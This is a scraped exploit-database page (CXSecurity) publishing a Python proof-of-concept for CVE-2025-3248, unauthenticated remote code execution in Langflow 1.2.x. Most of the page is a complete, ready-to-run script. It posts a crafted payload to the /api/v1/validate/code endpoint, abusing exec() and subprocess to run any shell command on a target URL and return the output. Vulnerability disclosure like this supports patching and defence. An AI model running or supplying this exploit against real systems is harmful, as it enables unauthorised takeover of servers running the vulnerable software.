---
title: Langflow 1.2.x Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025080001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-04
fetch_date: 2025-10-07T00:12:48.718867
---

# Langflow 1.2.x Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Langflow 1.2.x Remote Code Execution (RCE)** **2025.08.03**  Credit:  **[Raghad Abdallah Al-syouf](https://cxsecurity.com/author/Raghad%2BAbdallah%2BAl-syouf/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-3248](https://cxsecurity.com/cveshow/CVE-2025-3248/ "Click to see CVE-2025-3248")**  CWE: **N/A** | |

#!/usr/bin/env python3
# Exploit Title: Langflow 1.2.x - Remote Code Execution (RCE)
# Date: 2025-07-11
# Exploit Author: Raghad Abdallah Al-syouf
# Vendor Homepage: https://github.com/logspace-ai/langflow
# Software Link: https://github.com/logspace-ai/langflow/releases
# Version: <= 1.2.x
# Tested on: Ubuntu / Docker
# CVE: CVE-2025-3248
# Description:
#Langflow exposes a vulnerable endpoint `/api/v1/validate/code` that improperly evaluates arbitrary Python code via the `exec()` function. An unauthenticated remote attacker can execute arbitrary system commands.
# Usage:
#python3 cve-2025-3248.py http://target:7860 "id"
import requests
import argparse
import json
from urllib.parse import urljoin
from colorama import Fore, Style, init
import random
init(autoreset=True)
requests.packages.urllib3.disable\_warnings()
BANNER\_COLORS = [Fore.MAGENTA, Fore.CYAN, Fore.LIGHTBLUE\_EX]
def show\_banner():
print(f"""{Style.BRIGHT}{random.choice(BANNER\_COLORS)}
╔════════════════════════════════════════════════════╗
║ Langflow <= 1.2.x - CVE-2025-3248 ║
║ Remote Code Execution via exposed API ║
║ No authentication — triggers exec() call ║
╚════════════════════════════════════════════════════╝
Author: Raghad Abdallah Al-syouf
{Style.RESET\_ALL}""")
class LangflowRCE:
def \_\_init\_\_(self, target\_url, timeout=10):
self.base\_url = target\_url.rstrip('/')
self.session = requests.Session()
self.session.verify = False
self.session.headers = {
"User-Agent": "Langflow-RCE-Scanner",
"Content-Type": "application/json"
}
self.timeout = timeout
def run\_payload(self, command):
endpoint = urljoin(self.base\_url, "/api/v1/validate/code")
payload = {
"code": (
f"def run(cd=exec('raise Exception(\_\_import\_\_(\"subprocess\").check\_output(\"{command}\", shell=True))')): pass"
)
}
print(f"{Fore.YELLOW}[+] Sending crafted payload to: {endpoint}")
try:
response = self.session.post(endpoint, data=json.dumps(payload), timeout=self.timeout)
print(f"{Fore.YELLOW}[+] HTTP {response.status\_code}")
if response.status\_code == 200:
try:
json\_data = response.json()
err = json\_data.get("function", {}).get("errors", [""])[0]
if isinstance(err, str) and err.startswith("b'"):
output = err[2:-1].encode().decode("unicode\_escape").strip()
return output or "[!] No output returned."
except Exception as e:
return f"[!] Error parsing response: {e}"
return "[!] Target may not be vulnerable or is patched."
except Exception as e:
return f"[!] Request failed: {e}"
def main():
parser = argparse.ArgumentParser(description="PoC - CVE-2025-3248 | Langflow <= v1.2.x Unauthenticated RCE")
parser.add\_argument("url", help="Target URL (e.g., http://localhost:7860)")
parser.add\_argument("cmd", help="Command to execute remotely (e.g., whoami)")
args = parser.parse\_args()
show\_banner()
exploit = LangflowRCE(args.url)
result = exploit.run\_payload(args.cmd)
print(f"\n{Fore.GREEN}[+] Command Output:\n{Style.RESET\_ALL}{result}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top